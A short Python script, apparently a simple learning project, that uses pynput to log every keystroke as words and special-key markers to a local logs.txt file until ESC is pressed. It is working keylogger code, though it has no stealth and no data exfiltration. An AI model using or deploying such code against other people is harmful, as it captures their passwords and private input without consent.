from pynput import keyboard

log_file = "logs.txt"
current_word = ""  # store characters until space/enter

def on_press(key):
    global current_word

    try:
        if key.char.isalnum():  # letters or numbers
            current_word += key.char
        else:
            save_word()  # when hitting non-alnum (like space)
    except AttributeError:
        # Special keys
        if key == keyboard.Key.space:
            save_word()
            write_log("SPACE")
        elif key == keyboard.Key.enter:
            save_word()
            write_log("ENTER")
        else:
            save_word()
            write_log(f"[{key.name}]")

def save_word():
    global current_word
    if current_word:  # only if word is not empty
        write_log(current_word)
        current_word = ""

def write_log(text):
    with open(log_file, "a") as f:
        f.write(text + "\n")

def on_release(key):
    if key == keyboard.Key.esc:  # Press ESC to stop
        save_word()  # save last word
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
